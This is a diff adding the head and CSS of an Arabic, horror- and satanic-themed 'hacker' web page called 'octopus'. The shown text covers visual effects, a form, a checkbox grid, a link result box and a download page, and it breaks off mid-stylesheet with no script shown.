@@ -1,0 +1,2262 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆ · عرش الشيطان الهاكر</title>
+    <!-- Font Awesome 6 -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <!-- Google Fonts: Cinzel للفخامة, JetBrains Mono للكود -->
+    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@600;700;800;900&family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        /* ================================================================
+           عرش إبليس الهاكر الرقمي — جحيم حقيقي
+           Horror • Luxury • Satanic • Blood • Fire
+           ================================================================ */
+
+        /* ----- RESET & ROOT ----- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --blood-fresh: #cc0a0a;
+            --blood-deep: #440000;
+            --blood-dried: #3d1010;
+            --hellfire: #ff4400;
+            --hellfire-glow: rgba(255, 68, 0, 0.6);
+            --gold-molten: #d4a843;
+            --gold-glow: rgba(212, 168, 67, 0.3);
+            --obsidian: #050505;
+            --obsidian-light: #120808;
+            --charred: #1a0a0a;
+            --bone: #3a2a1a;
+            --text-hell: #d4b8a8;
+            --text-blood: #cc2222;
+            --font-display: 'Cinzel', 'Georgia', serif;
+            --font-mono: 'JetBrains Mono', 'Courier New', monospace;
+            --transition: 0.35s cubic-bezier(0.6, 0.04, 0.98, 0.34);
+        }
+
+        html,
+        body {
+            height: 100%;
+            margin: 0;
+            font-family: var(--font-mono);
+            background: var(--obsidian);
+            color: var(--text-hell);
+            overflow-x: hidden;
+            cursor: default;
+        }
+
+        /* ================================================================
+           CANVAS — الجحيم الحي: نار، دم، دخان، جماجم
+           ================================================================ */
+        #hell-canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            pointer-events: none;
+            opacity: 0.92;
+        }
+
+        /* ================================================================
+           المطر الدموي — Blood Rain (CSS)
+           ================================================================ */
+        .blood-rain {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            pointer-events: none;
+            overflow: hidden;
+        }
+        .blood-drop {
+            position: absolute;
+            top: -40px;
+            width: 2.5px;
+            background: rgba(170, 10, 10, 0.55);
+            box-shadow: 0 0 10px #cc0a0a;
+            animation: fall-blood linear infinite;
+            border-radius: 0 0 50% 50%;
+        }
+        @keyframes fall-blood {
+            0% {
+                transform: translateY(0) scaleY(1);
+                opacity: 0.85;
+            }
+            100% {
+                transform: translateY(110vh) scaleY(1.8);
+                opacity: 0.02;
+            }
+        }
+
+        /* ================================================================
+           جماجم محترقة في الخلفية
+           ================================================================ */
+        .skull-bg {
+            position: fixed;
+            pointer-events: none;
+            z-index: 0;
+            opacity: 0.12;
+            filter: drop-shadow(0 0 40px rgba(204, 10, 10, 0.1));
+        }
+        .skull-bg svg {
+            width: 100%;
+            height: 100%;
+        }
+
+        /* ================================================================
+           عيون شيطانية — Demonic Eyes
+           ================================================================ */
+        .eye-container {
+            position: fixed;
+            pointer-events: none;
+            z-index: 9997;
+            filter: drop-shadow(0 0 30px rgba(204, 10, 10, 0.15));
+        }
+        .eye-socket {
+            width: var(--size, 55px);
+            height: var(--size, 55px);
+            border-radius: 50%;
+            background: radial-gradient(ellipse at center, #150505, #000);
+            border: 2px solid rgba(204, 10, 10, 0.2);
+            box-shadow: inset 0 0 40px rgba(0, 0, 0, 0.9), 0 0 40px rgba(204, 10, 10, 0.05);
+            position: relative;
+            overflow: hidden;
+        }
+        .eye-socket::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at var(--pupil-x, 50%) var(--pupil-y, 50%),
+                    #ff1a1a 0%,
+                    #880000 25%,
+                    #1a0000 55%,
+                    #000 100%);
+            border-radius: 50%;
+            transition: none;
+        }
+        .eye-pupil {
+            position: absolute;
+            width: 32%;
+            height: 32%;
+            background: radial-gradient(circle at 35% 35%, #ff6600, #000);
+            border-radius: 50%;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            box-shadow: 0 0 30px rgba(255, 68, 0, 0.2);
+            transition: all 0.08s ease;
+        }
+        .eye-pupil::after {
+            content: '';
+            position: absolute;
+            width: 25%;
+            height: 25%;
+            background: radial-gradient(circle at 30% 30%, #ffaa55, transparent);
+            border-radius: 50%;
+            top: 20%;
+            left: 25%;
+            opacity: 0.5;
+        }
+        .eye-lid {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(ellipse at center, transparent 35%, rgba(8, 0, 0, 0.92) 80%, #000 100%);
+            border-radius: 50%;
+            pointer-events: none;
+            opacity: 0;
+            transition: opacity 0.06s ease;
+        }
+        .eye-lid.blink {
+            opacity: 1;
+            animation: blink-anim 0.15s ease;
+        }
+        @keyframes blink-anim {
+            0% {
+                opacity: 0;
+            }
+            35% {
+                opacity: 1;
+            }
+            100% {
+                opacity: 0;
+            }
+        }
+        .eye-glow-ring {
+            position: absolute;
+            top: -5px;
+            left: -5px;
+            width: calc(100% + 10px);
+            height: calc(100% + 10px);
+            border-radius: 50%;
+            border: 1px solid rgba(204, 10, 10, 0.1);
+            box-shadow: 0 0 50px rgba(204, 10, 10, 0.05);
+            pointer-events: none;
+            animation: eye-pulse 4s ease-in-out infinite;
+        }
+        @keyframes eye-pulse {
+            0%,
+            100% {
+                opacity: 0.2;
+                transform: scale(1);
+            }
+            50% {
+                opacity: 0.7;
+                transform: scale(1.06);
+            }
+        }
+
+        /* ================================================================
+           سلاسل صدئة — Rusty Chains
+           ================================================================ */
+        .chain-container {
+            position: fixed;
+            pointer-events: none;
+            z-index: 0;
+            opacity: 0.25;
+        }
+        .chain-link {
+            display: inline-block;
+            width: 7px;
+            height: 22px;
+            border: 2px solid #4a3a2a;
+            border-radius: 3px 3px 8px 8px;
+            margin: 0 -2px;
+            background: linear-gradient(180deg, #5a4a3a, #1a0a0a);
+            box-shadow: inset 0 0 8px rgba(0, 0, 0, 0.6);
+            transform-origin: center top;
+            animation: chain-swing var(--duration, 5s) ease-in-out infinite alternate;
+        }
+        .chain-link:nth-child(odd) {
+            animation-delay: 0.6s;
+        }
+        .chain-link:nth-child(3n) {
+            animation-duration: 5.5s;
+        }
+        @keyframes chain-swing {
+            0% {
+                transform: rotate(var(--swing-start, -10deg));
+            }
+            100% {
+                transform: rotate(var(--swing-end, 10deg));
+            }
+        }
+        .chain-rust {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 25%;
+            background: radial-gradient(ellipse at center, #6a3a1a, transparent);
+            opacity: 0.3;
+            border-radius: 50%;
+        }
+
+        /* ================================================================
+           MAIN WRAP
+           ================================================================ */
+        .app-wrap {
+            position: relative;
+            z-index: 1;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 18px 16px 30px;
+            background: transparent;
+        }
+
+        /* ================================================================
+           HEADER — العرش المحترق
+           ================================================================ */
+        .header {
+            width: 100%;
+            max-width: 1100px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 14px 28px;
+            margin-bottom: 28px;
+            background: rgba(5, 3, 3, 0.88);
+            backdrop-filter: blur(14px);
+            -webkit-backdrop-filter: blur(14px);
+            border: 1px solid rgba(204, 10, 10, 0.06);
+            border-radius: 0;
+            box-shadow: 0 0 80px rgba(204, 10, 10, 0.03), inset 0 0 80px rgba(204, 10, 10, 0.02);
+            position: relative;
+            overflow: hidden;
+            clip-path: polygon(0% 0%, 100% 0%, 98% 100%, 2% 100%);
+        }
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background:
+                repeating-linear-gradient(45deg, transparent, transparent 18px, rgba(204, 10, 10, 0.015) 18px, rgba(204, 10, 10, 0.015) 22px),
+                repeating-linear-gradient(-45deg, transparent, transparent 30px, rgba(80, 0, 0, 0.015) 30px, rgba(80, 0, 0, 0.015) 36px);
+            pointer-events: none;
+        }
+        .header::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: linear-gradient(90deg, transparent, var(--blood-fresh), var(--hellfire), var(--gold-molten), var(--blood-fresh), transparent);
+            background-size: 300% 100%;
+            animation: blood-scan 4.5s linear infinite;
+        }
+        @keyframes blood-scan {
+            0% {
+                background-position: 0% 0%;
+            }
+            100% {
+                background-position: 300% 0%;
+            }
+        }
+
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 18px;
+            font-weight: 900;
+            font-size: 24px;
+            letter-spacing: 2px;
+            color: #fff;
+            font-family: var(--font-display);
+            text-shadow: 0 0 40px rgba(204, 10, 10, 0.2);
+            position: relative;
+        }
+        .brand .brand-icon {
+            color: var(--blood-fresh);
+            font-size: 34px;
+            filter: drop-shadow(0 0 40px var(--hellfire-glow));
+            animation: brand-pulse 2.8s ease-in-out infinite;
+            position: relative;
+        }
+        .brand .brand-icon::after {
+            content: '';
+            position: absolute;
+            top: -10px;
+            left: -10px;
+            width: calc(100% + 20px);
+            height: calc(100% + 20px);
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(255, 68, 0, 0.08), transparent 70%);
+            animation: fire-ring 3s ease-in-out infinite;
+        }
+        @keyframes fire-ring {
+            0%,
+            100% {
+                transform: scale(0.8);
+                opacity: 0.3;
+            }
+            50% {
+                transform: scale(1.3);
+                opacity: 0.8;
+            }
+        }
+        @keyframes brand-pulse {
+            0%,
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+            50% {
+                transform: scale(1.06);
+                opacity: 0.75;
+            }
+        }
+
+        .brand .bot-name {
+            background: linear-gradient(135deg, #ff4444, #aa0000, #ff2200, #d4a843, #ff4400);
+            background-size: 300% 100%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-size: 30px;
+            letter-spacing: 5px;
+            animation: fire-text 5s linear infinite;
+            position: relative;
+            text-shadow: 0 0 60px rgba(255, 68, 0, 0.15);
+        }
+        .bot-name::after {
+            content: '🔥';
+            position: absolute;
+            top: -8px;
+            right: -28px;
+            font-size: 18px;
+            -webkit-text-fill-color: initial;
+            color: var(--hellfire);
+            animation: flame-float 2s ease-in-out infinite;
+            filter: drop-shadow(0 0 20px var(--hellfire-glow));
+        }
+        @keyframes flame-float {
+            0%,
+            100% {
+                transform: translateY(0) scale(1);
+                opacity: 0.8;
+            }
+            50% {
+                transform: translateY(-6px) scale(1.2);
+                opacity: 1;
+            }
+        }
+        @keyframes fire-text {
+            0% {
+                background-position: 0% 0%;
+            }
+            100% {
+                background-position: 300% 0%;
+            }
+        }
+
+        .brand .username {
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--text-blood);
+            background: rgba(204, 10, 10, 0.06);
+            padding: 5px 22px;
+            border-radius: 0;
+            border: 1px solid rgba(204, 10, 10, 0.08);
+            font-family: var(--font-mono);
+            -webkit-text-fill-color: #cc4444;
+            text-shadow: 0 0 30px rgba(204, 10, 10, 0.1);
+            clip-path: polygon(0% 0%, 90% 0%, 100% 20%, 100% 100%, 10% 100%, 0% 80%);
+            letter-spacing: 1px;
+            position: relative;
+        }
+        .brand .username::before {
+            content: '☠';
+            margin-left: 8px;
+            -webkit-text-fill-color: initial;
+            color: var(--blood-fresh);
+            font-size: 13px;
+        }
+        .brand .username i {
+            font-size: 11px;
+            margin-left: 5px;
+            -webkit-text-fill-color: var(--blood-fresh);
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 4px;
+        }
+        .nav-links a {
+            color: var(--text-hell);
+            text-decoration: none;
+            padding: 8px 24px;
+            border-radius: 0;
+            font-weight: 700;
+            font-size: 13px;
+            transition: var(--transition);
+            border: 1px solid transparent;
+            font-family: var(--font-display);
+            letter-spacing: 2px;
+            background: rgba(0, 0, 0, 0.25);
+            clip-path: polygon(0% 0%, 90% 0%, 100% 20%, 100% 100%, 10% 100%, 0% 80%);
+            position: relative;
+        }
+        .nav-links a::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, transparent 55%, rgba(204, 10, 10, 0.04));
+            pointer-events: none;
+        }
+        .nav-links a:hover {
+            background: rgba(204, 10, 10, 0.10);
+            border-color: var(--blood-fresh);
+            color: #fff;
+            box-shadow: 0 0 50px rgba(204, 10, 10, 0.08);
+            transform: scale(1.02);
+        }
+        .nav-links a i {
+            margin-left: 8px;
+            color: var(--hellfire);
+        }
+
+        /* ================================================================
+           CARD — مذبح الأوبسيديان مع الدم المتدفق
+           ================================================================ */
+        #cardArea {
+            width: 100%;
+            max-width: 820px;
+            padding: 34px 36px 40px;
+            background: rgba(8, 4, 4, 0.92);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 2px solid rgba(204, 10, 10, 0.04);
+            border-radius: 0;
+            box-shadow: 0 0 100px rgba(204, 10, 10, 0.02), inset 0 0 100px rgba(0, 0, 0, 0.6);
+            position: relative;
+            overflow: hidden;
+            clip-path: polygon(0% 0%, 100% 0%, 99% 100%, 1% 100%);
+        }
+        /* تشققات الدم */
+        #cardArea::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background:
+                repeating-linear-gradient(45deg, transparent, transparent 28px, rgba(204, 10, 10, 0.01) 28px, rgba(204, 10, 10, 0.01) 32px),
+                repeating-linear-gradient(-45deg, transparent, transparent 40px, rgba(80, 0, 0, 0.015) 40px, rgba(80, 0, 0, 0.015) 46px);
+            pointer-events: none;
+        }
+        #cardArea::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: linear-gradient(90deg, transparent, var(--blood-fresh), var(--hellfire), var(--gold-molten), var(--blood-fresh), transparent);
+            background-size: 300% 100%;
+            animation: blood-scan 4s linear infinite;
+        }
+
+        /* قطرات دم على الحواف */
+        .card-blood-drip {
+            position: absolute;
+            width: 3.5px;
+            background: linear-gradient(180deg, var(--blood-fresh), transparent);
+            pointer-events: none;
+            z-index: 3;
+            animation: drip-card var(--drip-duration, 5s) ease-in infinite;
+            opacity: 0;
+            border-radius: 0 0 50% 50%;
+        }
+        @keyframes drip-card {
+            0% {
+                opacity: 0;
+                height: 0;
+                transform: translateY(0);
+            }
+            12% {
+                opacity: 0.9;
+            }
+            85% {
+                opacity: 0.5;
+            }
+            100% {
+                opacity: 0;
+                height: var(--drip-height, 80px);
+                transform: translateY(var(--drip-offset, 25px));
+            }
+        }
+
+        .card-content {
+            position: relative;
+            z-index: 2;
+        }
+
+        /* ================================================================
+           STATUS BADGE — ختم شيطاني
+           ================================================================ */
+        .status-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 14px;
+            background: rgba(204, 10, 10, 0.04);
+            border: 1px solid rgba(204, 10, 10, 0.06);
+            padding: 7px 26px 7px 18px;
+            border-radius: 0;
+            font-size: 12px;
+            font-weight: 700;
+            color: var(--blood-fresh);
+            letter-spacing: 4px;
+            margin-bottom: 22px;
+            font-family: var(--font-display);
+            text-transform: uppercase;
+            clip-path: polygon(0% 0%, 90% 0%, 100% 20%, 100% 100%, 10% 100%, 0% 80%);
+            background: rgba(16, 0, 0, 0.35);
+            box-shadow: 0 0 40px rgba(204, 10, 10, 0.03);
+            position: relative;
+        }
+        .status-badge .dot {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            background: var(--blood-fresh);
+            border-radius: 50%;
+            animation: pulse-dot 1.4s infinite;
+            box-shadow: 0 0 40px var(--hellfire-glow);
+        }
+        @keyframes pulse-dot {
+            0%,
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+            50% {
+                opacity: 0.1;
+                transform: scale(0.4);
+            }
+        }
+        .status-badge i {
+            font-size: 15px;
+            color: var(--gold-molten);
+        }
+
+        .main-title {
+            font-size: 38px;
+            font-weight: 900;
+            letter-spacing: -0.5px;
+            margin: 0 0 6px;
+            color: #fff;
+            display: flex;
+            align-items: center;
+            gap: 18px;
+            font-family: var(--font-display);
+            text-shadow: 0 0 50px rgba(204, 10, 10, 0.15);
+        }
+        .main-title i {
+            color: var(--hellfire);
+            font-size: 36px;
+            filter: drop-shadow(0 0 50px var(--hellfire-glow));
+            animation: flicker-fire 2.8s infinite;
+        }
+        @keyframes flicker-fire {
+            0%,
+            100% {
+                opacity: 1;
+                transform: scale(1) rotate(0deg);
+            }
+            25% {
+                opacity: 0.75;
+                transform: scale(1.06) rotate(-2deg);
+            }
+            65% {
+                opacity: 0.85;
+                transform: scale(0.94) rotate(2deg);
+            }
+        }
+
+        .main-sub {
+            color: var(--text-hell);
+            font-size: 14px;
+            font-weight: 400;
+            margin-bottom: 30px;
+            border-right: 4px solid var(--blood-fresh);
+            padding-right: 20px;
+            font-family: var(--font-mono);
+            background: rgba(0, 0, 0, 0.25);
+            padding: 12px 20px;
+            box-shadow: inset 0 0 40px rgba(0, 0, 0, 0.3);
+            position: relative;
+            letter-spacing: 0.5px;
+        }
+        .main-sub i {
+            color: var(--hellfire);
+            margin-left: 12px;
+            font-size: 15px;
+        }
+
+        /* ================================================================
+           FORM — طاولة التضحية الدموية
+           ================================================================ */
+        .form-modern {
+            background: rgba(0, 0, 0, 0.45);
+            border-radius: 0;
+            padding: 22px 24px 26px;
+            border: 1px solid rgba(204, 10, 10, 0.04);
+            box-shadow: inset 0 0 80px rgba(0, 0, 0, 0.5), 0 0 50px rgba(204, 10, 10, 0.02);
+            position: relative;
+        }
+        .form-modern::before {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: 8%;
+            width: 84%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--hellfire), var(--gold-molten), var(--hellfire), transparent);
+            background-size: 200% 100%;
+            animation: fire-scan 3.5s linear infinite;
+        }
+        @keyframes fire-scan {
+            0% {
+                background-position: 0% 0%;
+            }
+            100% {
+                background-position: 200% 0%;
+            }
+        }
+
+        .field-group {
+            margin-bottom: 18px;
+        }
+        .field-group label {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            color: var(--text-hell);
+            font-weight: 700;
+            font-size: 14px;
+            margin-bottom: 6px;
+            letter-spacing: 2px;
+            font-family: var(--font-display);
+        }
+        .field-group label i {
+            color: var(--blood-fresh);
+            width: 22px;
+            font-size: 17px;
+            filter: drop-shadow(0 0 15px rgba(204, 10, 10, 0.15));
+        }
+        .field-group input[type="text"] {
+            width: 100%;
+            padding: 16px 22px;
+            border-radius: 0;
+            border: 1px solid rgba(204, 10, 10, 0.04);
+            background: rgba(0, 0, 0, 0.5);
+            color: #d4b0a0;
+            font-size: 15px;
+            font-family: var(--font-mono);
+            outline: none;
+            transition: var(--transition);
+            box-sizing: border-box;
+            box-shadow: inset 0 0 40px rgba(0, 0, 0, 0.3);
+        }
+        .field-group input[type="text"]:focus {
+            border-color: var(--blood-fresh);
+            box-shadow: 0 0 40px rgba(204, 10, 10, 0.08), inset 0 0 40px rgba(204, 10, 10, 0.03);
+            background: #1a0808;
+        }
+        .field-group input[type="text"]::placeholder {
+            color: #4a2a2a;
+            font-weight: 400;
+            letter-spacing: 1px;
+        }
+
+        /* ================================================================
+           CHECKBOX GROUP
+           ================================================================ */
+        .features-label {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            color: var(--text-hell);
+            font-weight: 700;
+            font-size: 14px;
+            margin: 6px 0 16px;
+            font-family: var(--font-display);
+            letter-spacing: 1.5px;
+        }
+        .features-label i {
+            color: var(--gold-molten);
+            font-size: 17px;
+            filter: drop-shadow(0 0 30px rgba(212, 168, 67, 0.15));
+        }
+
+        .checkbox-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 6px;
+            max-height: 280px;
+            overflow-y: auto;
+            padding: 6px 4px 6px 0;
+            background: rgba(0, 0, 0, 0.25);
+            border-radius: 0;
+            border: 1px solid rgba(204, 10, 10, 0.03);
+            scrollbar-width: thin;
+            scrollbar-color: var(--blood-fresh) transparent;
+        }
+        .checkbox-grid::-webkit-scrollbar {
+            width: 4px;
+        }
+        .checkbox-grid::-webkit-scrollbar-track {
+            background: transparent;
+        }
+        .checkbox-grid::-webkit-scrollbar-thumb {
+            background: var(--blood-fresh);
+            border-radius: 0;
+        }
+        @media (max-width: 540px) {
+            .checkbox-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .checkbox-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 10px 18px;
+            background: rgba(16, 4, 4, 0.25);
+            border-radius: 0;
+            transition: var(--transition);
+            cursor: pointer;
+            border: 1px solid transparent;
+            position: relative;
+        }
+        .checkbox-item:hover {
+            background: rgba(204, 10, 10, 0.04);
+            border-color: rgba(204, 10, 10, 0.06);
+            box-shadow: 0 0 30px rgba(204, 10, 10, 0.02);
+        }
+        .checkbox-item input[type="checkbox"] {
+            width: 19px;
+            height: 19px;
+            accent-color: var(--blood-fresh);
+            cursor: pointer;
+            flex-shrink: 0;
+            filter: drop-shadow(0 0 15px rgba(204, 10, 10, 0.1));
+        }
+        .checkbox-item label {
+            margin: 0;
+            font-weight: 500;
+            font-size: 13px;
+            cursor: pointer;
+            color: var(--text-hell);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            flex: 1;
+            font-family: var(--font-mono);
+            letter-spacing: 0.5px;
+        }
+        .checkbox-item label i {
+            color: var(--blood-dried);
+            font-size: 15px;
+            width: 22px;
+            text-align: center;
+            transition: var(--transition);
+        }
+        .checkbox-item input[type="checkbox"]:checked+.label-text i {
+            color: var(--hellfire);
+            filter: drop-shadow(0 0 30px var(--hellfire-glow));
+        }
+        .label-text {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        /* ================================================================
+           BUTTON — مذبح الأضحية الحي
+           ================================================================ */
+        .btn-primary {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 18px;
+            width: 100%;
+            padding: 22px 26px;
+            border: none;
+            border-radius: 0;
+            background: linear-gradient(135deg, #880a0a, #330000, #aa0a0a);
+            color: #fff;
+            font-weight: 900;
+            font-size: 20px;
+            font-family: var(--font-display);
+            cursor: pointer;
+            margin-top: 22px;
+            transition: var(--transition);
+            box-shadow: 0 0 60px rgba(204, 10, 10, 0.08), inset 0 -4px 0 #220000;
+            letter-spacing: 5px;
+            text-transform: uppercase;
+            clip-path: polygon(0% 0%, 92% 0%, 100% 25%, 100% 100%, 8% 100%, 0% 75%);
+            position: relative;
+            overflow: hidden;
+            text-shadow: 0 0 30px rgba(255, 68, 0, 0.1);
+        }
+        .btn-primary::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 200%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 68, 0, 0.10), rgba(212, 168, 67, 0.06), transparent);
+            transform: skewX(-30deg);
+            animation: fire-sweep 2.8s linear infinite;
+        }
+        @keyframes fire-sweep {
+            0% {
+                left: -100%;
+            }
+            100% {
+                left: 100%;
+            }
+        }
+        .btn-primary::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--gold-molten), var(--hellfire), var(--gold-molten), transparent);
+            animation: blood-scan 2.2s linear infinite;
+        }
+        .btn-primary:hover {
+            transform: translateY(-4px) scale(1.01);
+            box-shadow: 0 0 100px rgba(204, 10, 10, 0.15), inset 0 -4px 0 #550000;
+            background: linear-gradient(135deg, #aa0a0a, #440000, #cc1a0a);
+        }
+        .btn-primary:active {
+            transform: translateY(2px) scale(0.98);
+            box-shadow: 0 0 50px rgba(204, 10, 10, 0.06);
+        }
+        .btn-primary i {
+            font-size: 26px;
+            color: #ffcc88;
+            text-shadow: 0 0 40px #ff4400;
+            animation: icon-fire 1.8s ease-in-out infinite alternate;
+        }
+        @keyframes icon-fire {
+            0% {
+                transform: scale(1) rotate(0deg);
+            }
+            100% {
+                transform: scale(1.12) rotate(6deg);
+            }
+        }
+
+        /* ================================================================
+           RESULT
+           ================================================================ */
+        .result-box {
+            margin-top: 22px;
+            padding: 14px 20px;
+            border-radius: 0;
+            background: rgba(0, 0, 0, 0.55);
+            border: 1px solid rgba(204, 10, 10, 0.04);
+            display: flex;
+            align-items: center;
+            gap: 18px;
+            justify-content: space-between;
+            display: none;
+            box-shadow: inset 0 0 50px rgba(0, 0, 0, 0.4);
+            position: relative;
+        }
+        .result-box::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(45deg, transparent, transparent 35px, rgba(204, 10, 10, 0.008) 35px, rgba(204, 10, 10, 0.008) 40px);
+            pointer-events: none;
+        }
+        .result-box .link-text {
+            flex: 1;
+            color: #d4b0a0;
+            font-size: 13px;
+            font-weight: 500;
+            word-break: break-all;
+            font-family: var(--font-mono);
+            letter-spacing: 0.5px;
+            direction: ltr;
+            text-align: left;
+            position: relative;
+            z-index: 1;
+        }
+        .result-box .link-text i {
+            margin-left: 14px;
+            color: var(--hellfire);
+            font-size: 17px;
+        }
+        .btn-copy {
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+            padding: 10px 26px;
+            border-radius: 0;
+            background: rgba(204, 10, 10, 0.04);
+            border: 1px solid rgba(204, 10, 10, 0.04);
+            color: #d4b0a0;
+            font-weight: 700;
+            font-size: 13px;
+            cursor: pointer;
+            transition: var(--transition);
+            font-family: var(--font-mono);
+            flex-shrink: 0;
+            clip-path: polygon(0% 0%, 86% 0%, 100% 15%, 100% 100%, 14% 100%, 0% 85%);
+            position: relative;
+            z-index: 1;
+            letter-spacing: 1px;
+        }
+        .btn-copy:hover {
+            background: rgba(204, 10, 10, 0.10);
+            border-color: var(--blood-fresh);
+            color: #fff;
+            box-shadow: 0 0 50px rgba(204, 10, 10, 0.04);
+        }
+        .btn-copy i {
+            font-size: 15px;
+            color: var(--gold-molten);
+        }
+
+        /* ================================================================
+           FOOTER — توقيع محترق فخم
+           ================================================================ */
+        .madeby {
+            margin-top: 32px;
+            text-align: center;
+            color: var(--text-muted);
+            font-size: 13px;
+            font-weight: 400;
+            letter-spacing: 4px;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            flex-wrap: wrap;
+            justify-content: center;
+            border-top: 1px solid rgba(204, 10, 10, 0.04);
+            padding-top: 24px;
+            width: 100%;
+            max-width: 820px;
+            font-family: var(--font-display);
+            text-transform: uppercase;
+        }
+        .madeby i {
+            color: var(--blood-fresh);
+            margin: 0 8px;
+            animation: pulse-icon 2.8s infinite;
+        }
+        @keyframes pulse-icon {
+            0%,
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+            50% {
+                opacity: 0.3;
+                transform: scale(0.7);
+            }
+        }
+        .madeby .sep {
+            opacity: 0.08;
+        }
+        .madeby .dev {
+            color: var(--hellfire);
+            font-weight: 900;
+            text-shadow: 0 0 40px rgba(204, 10, 10, 0.15);
+            font-size: 18px;
+            letter-spacing: 5px;
+            background: linear-gradient(135deg, #ff4444, #d4a843);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            position: relative;
+        }
+        .madeby .dev::after {
+            content: '🔥';
+            position: absolute;
+            top: -8px;
+            right: -26px;
+            font-size: 14px;
+            -webkit-text-fill-color: initial;
+            color: var(--hellfire);
+            animation: flame-float 2.5s ease-in-out infinite;
+        }
+
+        /* ================================================================
+           CAPTURE BADGE (id="captureBadge")
+           ================================================================ */
+        #captureBadge {
+            position: fixed;
+            top: 22px;
+            right: 22px;
+            z-index: 9998;
+            background: rgba(6, 3, 3, 0.88);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            padding: 10px 28px;
+            border-radius: 0;
+            font-weight: 700;
+            font-size: 12px;
+            color: var(--blood-fresh);
+            border: 1px solid rgba(204, 10, 10, 0.04);
+            display: none;
+            align-items: center;
+            gap: 14px;
+            box-shadow: 0 0 60px rgba(204, 10, 10, 0.02);
+            font-family: var(--font-mono);
+            clip-path: polygon(0% 0%, 90% 0%, 100% 20%, 100% 100%, 10% 100%, 0% 80%);
+            letter-spacing: 2px;
+        }
+        #captureBadge i {
+            font-size: 16px;
+            color: var(--hellfire);
+        }
+        #captureBadge .pulse-ring {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: var(--blood-fresh);
+            animation: pulse-dot 1.4s infinite;
+            box-shadow: 0 0 40px var(--hellfire-glow);
+        }
+
+        /* ================================================================
+           SIDE PAGE (download) — جحيم التحميل
+           ================================================================ */
+        .download-page {
+            width: 100%;
+            min-height: 100vh;
+            background: var(--obsidian);
+            padding: 30px 20px;
+            box-sizing: border-box;
+            font-family: var(--font-mono);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .download-box {
+            max-width: 560px;
+            width: 100%;
+            background: rgba(8, 4, 4, 0.94);
+            backdrop-filter: blur(14px);
+            border: 2px solid rgba(204, 10, 10, 0.04);
+            padding: 36px 32px 40px;
+            border-radius: 0;
+            box-shadow: 0 0 100px rgba(204, 10, 10, 0.02);
+            text-align: center;
+            clip-path: polygon(0% 0%, 100% 0%, 98% 100%, 2% 100%);
+            position: relative;
+            overflow: hidden;
+        }
+        .download-box::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
